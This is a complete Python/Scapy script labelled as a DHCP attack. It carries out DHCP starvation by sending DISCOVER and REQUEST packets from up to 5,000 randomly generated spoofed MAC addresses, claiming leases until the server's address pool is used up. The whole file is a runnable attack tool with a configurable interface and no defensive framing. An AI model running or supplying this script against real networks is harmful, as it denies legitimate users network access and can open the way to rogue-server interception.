#!/usr/bin/env python3
from scapy.all import *
import random
import time

conf.checkIPaddr = False

# 🔧 CHANGE THIS if needed
iface = "wlp0s20f3"

# ⚙️ CONFIG
TOTAL_CLIENTS = 5000   # target scale
RATE = 10              # packets per second
TIMEOUT = 5            # wait for OFFER

# 🔹 Generate random MAC
def gen_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))

# 🔹 Generate transaction ID
def gen_xid():
    return random.randint(1, 0xFFFFFFFF)

# 🔹 DHCP DISCOVER
def dhcp_discover(mac, xid):
    return (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac2str(mac), xid=xid) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

# 🔹 DHCP REQUEST
def dhcp_request(mac, xid, offered_ip, server_ip):
    return (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac2str(mac), xid=xid) /
        DHCP(options=[
            ("message-type", "request"),
            ("requested_addr", offered_ip),
            ("server_id", server_ip),
            "end"
        ])
    )

print(f"[+] Starting DHCP attack on {iface}")

success = 0
fail = 0

for i in range(TOTAL_CLIENTS):
    mac = gen_mac()
    xid = gen_xid()

    print(f"\n[+] Client {i+1}/{TOTAL_CLIENTS}")
    print(f"    MAC: {mac}")

    # 🚀 Step 1: Send DISCOVER
    sendp(dhcp_discover(mac, xid), iface=iface, verbose=0)

    # 🔍 Step 2: Capture OFFER
    def handle_offer(pkt):
        if pkt.haslayer(DHCP) and pkt.haslayer(BOOTP):
            if pkt[BOOTP].xid == xid:
                for opt in pkt[DHCP].options:
                    if opt[0] == "message-type" and opt[1] == 2:
                        return True
        return False

    packets = sniff(
        iface=iface,
        filter="udp and (port 67 or 68)",
        timeout=TIMEOUT,
        lfilter=handle_offer,
        count=1
    )

    if packets:
        offer_pkt = packets[0]
        offered_ip = offer_pkt[BOOTP].yiaddr
        server_ip = offer_pkt[IP].src

        print(f"    ✅ OFFER: {offered_ip}")

        # 🚀 Step 3: Send REQUEST
        sendp(dhcp_request(mac, xid, offered_ip, server_ip), iface=iface, verbose=0)
        print("    → REQUEST sent")

        success += 1
    else:
        print("    ❌ No OFFER")
        fail += 1

    time.sleep(1 / RATE)

# 📊 Summary
print("\n====== SUMMARY ======")
print(f"Success: {success}")
print(f"Failed : {fail}")
